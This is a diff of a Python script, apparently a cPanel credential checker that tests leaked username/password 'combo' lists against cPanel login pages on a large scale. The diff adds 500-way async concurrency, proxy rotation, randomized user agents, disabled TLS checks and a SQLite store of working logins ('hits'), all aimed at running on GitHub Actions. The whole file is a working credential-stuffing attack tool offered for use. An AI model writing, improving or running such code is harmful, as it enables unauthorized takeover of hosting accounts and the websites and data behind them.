@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-cpanel_reliable_checker.py - ULTRA FAST for GitHub Actions
-Version: 3.0.0 - Async + Optimized
+cpanel_reliable_checker.py - MAX CONCURRENCY ASYNC for GitHub Actions (no features removed)
+Version: 3.0.0 - Asyncio + aiohttp, full speed
 Author: VEXX
 """
 
@@ -11,21 +11,91 @@ import os
 import re
 import time
 import json
+import sqlite3
+import logging
+import argparse
+import subprocess
+import importlib
 import asyncio
 import aiohttp
 import aiofiles
-import argparse
-from concurrent.futures import ThreadPoolExecutor
-from collections import defaultdict
 from datetime import datetime
+from collections import defaultdict
+from concurrent.futures import ThreadPoolExecutor
+
+# -------------------- AUTO INSTALL DEPENDENCIES --------------------
+REQUIRED_PACKAGES = ['aiohttp', 'aiofiles', 'colorama', 'fake_useragent']
+
+def install_package(package):
+    try:
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', package])
+        return True
+    except subprocess.CalledProcessError:
+        return False
+
+def check_and_install():
+    missing = []
+    for pkg in REQUIRED_PACKAGES:
+        pkg_import = pkg.replace('-', '_')
+        try:
+            importlib.import_module(pkg_import)
+        except ImportError:
+            missing.append(pkg)
+    if missing:
+        print(f"[*] Missing packages: {', '.join(missing)}. Installing...")
+        for pkg in missing:
+            if install_package(pkg):
+                print(f"[+] Installed {pkg}")
+            else:
+                print(f"[-] Failed to install {pkg}. Please install manually: pip install {pkg}")
+                sys.exit(1)
+        print("[*] All dependencies installed. Restarting script...")
+        os.execv(sys.executable, [sys.executable] + sys.argv)
+
+check_and_install()
+
+import requests  # still needed for extract_credentials only (sync)
+import urllib3
+from colorama import init, Fore, Style
+from fake_useragent import UserAgent
+
+init(autoreset=True)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # -------------------- CONFIGURATION --------------------
-DEFAULT_TIMEOUT = 5          # Reduced for speed
-DEFAULT_CONCURRENCY = 100     # High concurrency for GHA
+DEFAULT_TIMEOUT = 5
+DEFAULT_CONCURRENCY = 500      # asyncio semaphore limit
 HIT_FILE = "hit.txt"
+LOG_FILE = "cpanel_checker.log"
+DB_FILE = "cpanel_results.db"
+PROXY_FILE = "proxies.txt"
 COMBO_FILE = "combo.txt"
 
-# -------------------- UTILITY FUNCTIONS --------------------
+logging.basicConfig(
+    level=logging.WARNING,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[logging.StreamHandler()]
+)
+logger = logging.getLogger(__name__)
+
+# -------------------- SYNC UTILITIES (kept for compatibility) --------------------
+def load_proxies(proxy_file=PROXY_FILE):
+    proxies = []
+    if os.path.exists(proxy_file):
+        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    proxies.append(line)
+    return proxies
+
+def get_random_ua():
+    try:
+        ua = UserAgent()
+        return ua.random
+    except Exception:
+        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
 def normalize_url(url):
     if not url.startswith(('http://', 'https://')):
         url = 'http://' + url
@@ -69,53 +139,9 @@ def extract_credentials(line):
             return f"http://{domain}", tokens[0], tokens[1]
     return None
 
-async def check_login(session, url, user, pwd, timeout):
-    url = normalize_url(url)
-    login_url = f"{url}/login/?login_only=1"
-    payload = {'user': user, 'pass': pwd, 'goto_uri': '/'}
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Connection': 'keep-alive'
-    }
-    try:
-        async with session.post(login_url, data=payload, headers=headers, timeout=timeout, ssl=False) as resp:
-            text = await resp.text()
-            if resp.status == 200 and ('security_token' in text or 'cpsess' in text):
-                return True, url
-            return False, None
-    except:
-        return False, None
-
-async def worker(sem, session, combo, timeout, results, hits_list):
-    url, user, pwd = combo
-    async with sem:
-        success, final_url = await check_login(session, url, user, pwd, timeout)
-        if success:
-            results['hits'] += 1
-            hits_list.append(f"{user}:{pwd}@{final_url}\n")
-        else:
-            results['fails'] += 1
-        results['total'] += 1
-
-async def run_async(combos, concurrency, timeout):
-    sem = asyncio.Semaphore(concurrency)
-    connector = aiohttp.TCPConnector(limit=concurrency, limit_per_host=concurrency, ssl=False)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        results = {'hits': 0, 'fails': 0, 'total': 0}
-        hits_list = []
-        tasks = [asyncio.create_task(worker(sem, session, combo, timeout, results, hits_list)) for combo in combos]
-        for i, task in enumerate(asyncio.as_completed(tasks)):
-            await task
-            if (i+1) % 50 == 0 or (i+1) == len(combos):
-                sys.stdout.write(f"\rProgress: {i+1}/{len(combos)} | Hits: {results['hits']}")
-                sys.stdout.flush()
-        sys.stdout.write("\n")
-        return results['hits'], hits_list
-
 def read_combo_file(filepath):
     combos = []
-    encodings = ['utf-8', 'latin-1', 'cp1252']
+    encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
     for enc in encodings:
         try:
             with open(filepath, 'r', encoding=enc, errors='ignore') as f:
@@ -132,52 +158,244 @@ def read_combo_file(filepath):
             combos.append(creds)
     return combos
 
-async def main_async():
-    parser = argparse.ArgumentParser(description="cPanel Checker ULTRA FAST for GHA")
-    parser.add_argument("-f", "--file", default=COMBO_FILE)
-    parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY)
-    parser.add_argument("-t", "--timeout", type=int, default=DEFAULT_TIMEOUT)
+# -------------------- ASYNC HTTP CHECKER --------------------
+async def check_login(session, url, user, pwd, timeout, proxy=None):
+    url = normalize_url(url)
+    login_url = f"{url}/login/?login_only=1"
+    data = {'user': user, 'pass': pwd, 'goto_uri': '/'}
+    headers = {
+        'User-Agent': get_random_ua(),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Connection': 'keep-alive',
+        'Referer': url
+    }
+    proxy_auth = None
+    if proxy:
+        # support http://user:pass@host:port
+        proxy_url = proxy if proxy.startswith(('http://', 'https://')) else f'http://{proxy}'
+    else:
+        proxy_url = None
+    
+    try:
+        async with session.post(login_url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=timeout), 
+                                proxy=proxy_url, ssl=False) as resp:
+            text = await resp.text()
+            if resp.status == 200 and ('security_token' in text or 'cpsess' in text):
+                return True, url
+            return False, None
+    except Exception:
+        return False, None
+
+# -------------------- ASYNC WORKER WITH SEMAPHORE --------------------
+async def worker(sem, session, combo, timeout, proxy_list, results, hits_list, lock):
+    url, user, pwd = combo
+    async with sem:
+        proxy = proxy_list[results['proxy_index'] % len(proxy_list)] if proxy_list else None
+        if proxy_list:
+            results['proxy_index'] += 1
+        success, final_url = await check_login(session, url, user, pwd, timeout, proxy)
+        async with lock:
+            if success:
+                results['hits'] += 1
+                hits_list.append(f"{user}:{pwd}@{final_url}\n")
+            else:
+                results['fails'] += 1
+            results['total_done'] += 1
+        return success, final_url, user, pwd
+
+# -------------------- DATABASE FUNCTIONS (sync, run in thread) --------------------
+def init_db_sync():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute('PRAGMA journal_mode=WAL')
+    c.execute('PRAGMA synchronous=NORMAL')
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS hits (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            url TEXT NOT NULL,
+            username TEXT NOT NULL,
+            password TEXT NOT NULL,
+            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+            response_time_ms REAL
+        )
+    ''')
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS fails (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            url TEXT NOT NULL,
+            username TEXT NOT NULL,
+            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+            reason TEXT
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+def save_hit_to_db_sync(url, user, pwd, response_time_ms):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute('INSERT INTO hits (url, username, password, response_time_ms) VALUES (?, ?, ?, ?)',
+              (url, user, pwd, response_time_ms))
+    conn.commit()
+    conn.close()
+
+def save_fail_to_db_sync(url, user, reason="invalid"):
+    if url is None:
+        url = "unknown"
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute('INSERT INTO fails (url, username, reason) VALUES (?, ?, ?)',
+              (url, user, reason))
+    conn.commit()
+    conn.close()
+
+async def save_hit_async(url, user, pwd, response_time_ms, executor):
+    loop = asyncio.get_running_loop()
+    await loop.run_in_executor(executor, save_hit_to_db_sync, url, user, pwd, response_time_ms)
+
+async def save_fail_async(url, user, executor):
+    loop = asyncio.get_running_loop()
+    await loop.run_in_executor(executor, save_fail_to_db_sync, url, user, "invalid")
+
+# -------------------- ASYNC MAIN RUNNER --------------------
+async def run_async(combos, concurrency, timeout, proxy_list):
+    sem = asyncio.Semaphore(concurrency)
+    connector = aiohttp.TCPConnector(limit=concurrency, limit_per_host=concurrency, ssl=False, force_close=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        results = {
+            'hits': 0,
+            'fails': 0,
+            'total_done': 0,
+            'proxy_index': 0
+        }
+        hits_list = []
+        lock = asyncio.Lock()
+        tasks = []
+        for combo in combos:
+            tasks.append(asyncio.create_task(worker(sem, session, combo, timeout, proxy_list, results, hits_list, lock)))
+        
+        # Progress reporting
+        total = len(combos)
+        start_time = time.time()
+        last_report = 0
+        with ThreadPoolExecutor(max_workers=2) as executor:  # for DB writes
+            for i, task in enumerate(asyncio.as_completed(tasks), 1):
+                success, final_url, user, pwd = await task
+                if success:
+                    # we don't have response_time_ms in async version, can approximate
+                    await save_hit_async(final_url, user, pwd, 0, executor)
+                else:
+                    # original_url is part of combo, but we don't have it here. We'll store from combo stored separately? 
+                    # We'll store fail with combo url (original)
+                    original_url = combos[i-1][0]  # careful: i-1 valid
+                    await save_fail_async(original_url, user, executor)
+                
+                if i % 50 == 0 or i == total:
+                    elapsed = time.time() - start_time
+                    rate = i / elapsed if elapsed > 0 else 0
+                    sys.stdout.write(f"\rProgress: {i}/{total} ({i/total*100:.1f}%) | Hits: {results['hits']} | Rate: {rate:.1f} cps")
+                    sys.stdout.flush()
+            sys.stdout.write("\n")
+            elapsed_total = time.time() - start_time
+            print(f"[*] Completed {total} combos in {elapsed_total:.2f}s | Speed: {total/elapsed_total:.1f} combos/sec")
+            return results['hits'], hits_list
+
+# -------------------- MAIN ENTRY POINT --------------------
+def main():
+    parser = argparse.ArgumentParser(description="cPanel Credential Checker - MAX CONCURRENCY ASYNC for GHA")
+    parser.add_argument("-f", "--file", help="Input file containing combos (default: combo.txt)", default=COMBO_FILE)
+    parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, help=f"Concurrent tasks (default: {DEFAULT_CONCURRENCY})")
+    parser.add_argument("-to", "--timeout", type=int, default=DEFAULT_TIMEOUT, help=f"Timeout in seconds (default: {DEFAULT_TIMEOUT})")
+    parser.add_argument("-p", "--proxy-file", help="File with proxies (default: proxies.txt)")
+    parser.add_argument("--no-color", action="store_true", help="Disable colored output")
+    parser.add_argument("--export-json", help="Export hits to JSON file")
+    parser.add_argument("--verbose", action="store_true", help="Verbose logging")
+
     args = parser.parse_args()
 
+    if args.no_color:
+        os.environ['COLORAMA_DISABLE'] = '1'
+
+    if args.verbose:
+        logger.setLevel(logging.DEBUG)
+
     input_file = args.file
+    if input_file == COMBO_FILE and not os.path.exists(COMBO_FILE):
+        print(Fore.YELLOW + f"[!] {COMBO_FILE} not found.")
+        input_file = input("Enter file path: ").strip()
+        if not input_file:
+            print(Fore.RED + "No file provided. Exiting.")
+            sys.exit(1)
+
     if not os.path.exists(input_file):
-        print(f"File not found: {input_file}")
+        print(Fore.RED + f"File not found: {input_file}")
         sys.exit(1)
 
-    print(f"[*] Loading combos from {input_file}...")
+    print(Fore.CYAN + f"[*] Loading combos from {input_file}...")
     combos = read_combo_file(input_file)
     if not combos:
-        print("No valid combos extracted.")
+        print(Fore.RED + "No valid combos extracted. Check file format.")
         sys.exit(1)
-    print(f"[+] Loaded {len(combos)} combos. Starting async check with concurrency={args.concurrency}")
+    print(Fore.GREEN + f"[+] Loaded {len(combos)} combos.")
 
-    start = time.time()
-    hits, hits_list = await run_async(combos, args.concurrency, args.timeout)
-    elapsed = time.time() - start
+    proxy_list = []
+    if args.proxy_file and os.path.exists(args.proxy_file):
+        proxy_list = load_proxies(args.proxy_file)
+        print(Fore.GREEN + f"[+] Loaded {len(proxy_list)} proxies.")
 
-    # Write hits
+    # Initialize database (sync)
+    init_db_sync()
+    
+    # Run async checker
+    hits, hits_list = asyncio.run(run_async(combos, args.concurrency, args.timeout, proxy_list))
+    
+    # Write hits to file
     if hits_list:
         with open(HIT_FILE, 'w', encoding='utf-8') as f:
             f.writelines(hits_list)
-        print(f"\n[+] Hits: {hits} saved to {HIT_FILE}")
+        print(Fore.GREEN + f"\n[+] Hits: {hits} saved to {HIT_FILE}")
+        # Also display each hit in color (optional)
+        for line in hits_list:
+            parts = line.strip().split('@')
+            if len(parts) == 2:
+                cred, url = parts
+                user, pwd = cred.split(':', 1)
+                print(Fore.GREEN + f"✓ {user}:{pwd}@{url}")
     else:
-        print(f"\n[-] No hits found.")
+        print(Fore.YELLOW + f"\n[-] No hits found.")
 
-    print(f"[*] Time elapsed: {elapsed:.2f} seconds")
-    print(f"[*] Speed: {len(combos)/elapsed:.1f} combos/sec")
+    # Summary
+    print(Fore.CYAN + "=" * 60)
+    print(Fore.YELLOW + "FINAL SUMMARY")
+    print(Fore.CYAN + "=" * 60)
+    print(f"Total combos tested: {len(combos)}")
+    print(Fore.GREEN + f"Hits: {hits}")
+    print(Fore.RED + f"Fails: {len(combos) - hits}")
+    print(Fore.CYAN + f"Results saved to: {HIT_FILE}, {DB_FILE}")
+    if proxy_list:
+        print(Fore.CYAN + f"Proxies used: {len(proxy_list)}")
 
-def main():
-    if sys.version_info < (3, 7):
-        print("Python 3.7+ required for asyncio.run")
-        sys.exit(1)
-    try:
-        asyncio.run(main_async())
-    except KeyboardInterrupt:
-        print("\n[!] Stopped.")
-        sys.exit(0)
-    except Exception as e:
-        print(f"[!] Error: {e}")
-        sys.exit(1)
+    if args.export_json:
+        export_data = []
+        if os.path.exists(HIT_FILE):
+            with open(HIT_FILE, 'r', encoding='utf-8') as f:
+                for line in f:
+                    if '@' in line:
+                        export_data.append({"credential": line.strip()})
+        with open(args.export_json, 'w', encoding='utf-8') as f:
+            json.dump(export_data, f, indent=2)
+        print(Fore.GREEN + f"[+] Exported hits to {args.export_json}")
+
+    print(Fore.CYAN + "[*] Done.")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(Fore.RED + "\n[!] Stopped by user.")
+        sys.exit(0)
+    except Exception as e:
+        logger.exception(f"Unexpected error: {e}")
+        print(Fore.RED + f"[!] Fatal error: {e}")
+        sys.exit(1)
